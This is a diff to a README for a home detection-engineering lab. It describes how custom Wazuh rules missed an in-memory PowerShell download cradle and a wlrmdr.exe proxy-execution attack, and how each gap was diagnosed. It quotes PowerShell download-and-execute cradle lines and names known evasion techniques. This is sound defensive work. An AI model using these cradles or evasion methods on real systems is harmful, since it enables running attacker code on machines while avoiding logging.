@@ -84,7 +84,7 @@ Each technique was run with Atomic Red Team, then investigated with the loop: **
 
 ## Custom Detection Rules
 
-All custom rules live in `/var/ossec/etc/rules/local_rules.xml` on the manager (IDs 100000+). The full file is in [`local_rules.xml`](local_rules.xml). Summary:
+All custom rules live in `/var/ossec/etc/rules/local_rules.xml` on the manager (IDs 100000+). The full file is in [`rules/local_rules.xml`](rules/local_rules.xml). Summary:
 
 | Rule | Level | What it detects | ATT&CK |
 |---|---|---|---|
@@ -127,6 +127,44 @@ Custom rules firing against live emulated attacks:
 **One watchlist rule (100190) catching multiple T1112 registry-modification techniques:**
 
 ![T1112 watchlist catching multiple techniques](screenshots/100190-t1112-watchlist.png)
+
+---
+
+## Detection Investigation Deep-Dive — The In-Memory Blind Spot
+
+The single most instructive investigation in this project. It's a good example of *why* a detection fails even when the logic looks correct — and why the fix was a different telemetry source, not a better regex.
+
+**Setup.** I wrote rule **100100** to catch PowerShell download cradles by matching download methods (`DownloadString`, `Invoke-WebRequest`, …) on the process **command line**. A direct test confirmed it worked — launching `powershell.exe -Command "(New-Object Net.WebClient).DownloadString('http://…')"` fired the alert.
+
+**The failure.** I then ran the real adversary-emulation version of the technique (an `IEX` download cradle). The attack ran — and **rule 100100 never fired.** A search for `rule.id:100100` came back empty. My detection was blind to the exact thing it was written to catch.
+
+**Diagnosis.** I pulled the process-creation event the test generated and looked at how the cradle was actually delivered:
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('.../payload.ps1')
+```
+
+That was the whole answer. `IEX` (Invoke-Expression) executes code **in memory, inside an already-running PowerShell process** — so there's no new process, and nothing with the payload on its command line. Command-line telemetry only sees a payload when it rides in as a *new process's launch argument*. I confirmed the mechanism both ways: the `powershell.exe -Command "…"` form (which spawns a new process) was caught, while the in-memory `IEX` form evaded the rule entirely. **Same payload, different delivery, different detection surface** — and running code in memory is a deliberate, well-known attacker evasion.
+
+**The fix — a different data source, not a better rule.** Command-line logging records *how PowerShell was launched*; **Script Block Logging (Event 4104)** records *what it actually executed*, in-memory code included. I enabled it, forwarded the `Microsoft-Windows-PowerShell/Operational` channel to Wazuh, and wrote rule **100110** to match the cradle in the executed **script-block text** instead of the command line. Re-running the attack, the detection fired.
+
+**Takeaway.** One technique, two detection surfaces. Covering the command line alone leaves an in-memory blind spot; pairing it with execution (script-block) logging closes it. *Where* you detect is as important as *what* you match — the lesson that shaped the rest of the project.
+
+---
+
+## Diagnosing a Detection Gap — a Telemetry Blind Spot (T1218)
+
+Not every gap is a missing rule; some are missing **telemetry**. This one is a gap I diagnosed but deliberately *couldn't* close with a rule — and understanding why is the point.
+
+I ran `wlrmdr.exe` (T1218, System Binary Proxy Execution), a signed Windows binary abused to proxy execution. It **succeeded** — it launched Calculator, confirming the technique worked. But when I went to investigate, searching for the `wlrmdr` process returned nothing, and the only alerts in the dashboard were unrelated harness noise plus one false positive:
+
+![Detection gap — wlrmdr blind spot and a false positive](screenshots/gap-wlrmdr-blindspot.png)
+
+**How I diagnosed it.** The attack had clearly run, so I worked backwards from "no alert" through the detection pipeline: *rule → event → telemetry source.* The rule logic (match `image` ending in `wlrmdr.exe`) was sound, so I checked whether the underlying event even existed — and it didn't. The Sysmon config filters `wlrmdr` out of process-creation logging to cut noise, so no Event 1 was ever generated. **There was nothing for any rule to match.** The gap wasn't in the detection logic — it was one layer down, in what the endpoint was configured to collect.
+
+**The honest outcome.** The fix here isn't a cleverer rule; it's **expanding telemetry collection** (removing `wlrmdr` from the Sysmon filter). I wrote the detection logic anyway — rule **100180** — and documented it as *pending telemetry*, so the moment the event is collected, the detection is already in place. Shipping a rule that can't fire yet, clearly labelled, is an honest way to track a known blind spot.
+
+> The one high-severity alert visible above ("Executable file dropped in a folder commonly used by malware") is itself a **false positive** — it fired on a benign PowerShell `__PSScriptPolicyTest` file, not on the attack. I tuned it out separately with rule **100170**. So this single view captures two real detection-engineering problems at once: a telemetry blind spot *and* a noisy false positive.
 
 ---
 
